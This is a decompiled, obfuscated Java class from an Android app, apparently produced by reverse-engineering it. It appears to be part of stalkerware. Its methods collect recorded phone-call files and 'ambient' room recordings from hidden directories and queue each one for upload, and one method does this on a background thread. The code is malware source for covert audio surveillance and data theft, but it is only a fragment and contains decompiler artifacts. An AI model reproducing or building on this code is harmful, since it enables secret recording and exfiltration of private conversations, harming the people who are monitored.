package com.app.system.common.f;

import android.content.Context;
import com.app.system.common.f.a.b;
import com.app.system.common.f.a.e;
import java.io.File;

public class m
  extends a
{
  public static void k(Context paramContext)
  {
    String str = com.app.system.common.h.c(paramContext);
    Object localObject = new StringBuilder();
    ((StringBuilder)localObject).append(com.app.system.common.c.f);
    ((StringBuilder)localObject).append("RecordCall/");
    localObject = new File(((StringBuilder)localObject).toString());
    if (((File)localObject).exists())
    {
      localObject = ((File)localObject).listFiles();
      int i = localObject.length;
      for (int j = 0; j < i; j++)
      {
        com.app.system.common.f.a.c localc = new com.app.system.common.f.a.c(str, localObject[j]);
        com.app.system.common.f.a.h.a().a(localc);
      }
    }
    com.app.system.common.f.a.h.a().a(paramContext);
  }
  
  public static void l(Context paramContext)
  {
    String str = com.app.system.common.h.c(paramContext);
    Object localObject1 = new File(com.app.system.common.c.f, "RecAmbient/");
    if (((File)localObject1).exists()) {
      for (Object localObject2 : ((File)localObject1).listFiles()) {
        if (!com.app.system.common.h.a((File)localObject2).equals("2_AMBIENT"))
        {
          localObject2 = new b(str, (File)localObject2);
          com.app.system.common.f.a.h.a().a((e)localObject2);
        }
      }
    }
    com.app.system.common.f.a.h.a().a(paramContext);
  }
  
  public static void m(Context paramContext)
  {
    try
    {
      Thread localThread = new java/lang/Thread;
      Runnable local1 = new com/app/system/common/f/m$1;
      local1.<init>(paramContext);
      localThread.<init>(local1);
      localThread.start();
    }
    catch (Exception paramContext)
    {
      com.security.d.a.d("RecordCall", paramContext.getMessage(), new Object[0]);
    }
  }
}


/* Location:              ~/com/app/system/common/f/m.class
 *
 * Reversed by:           J
 */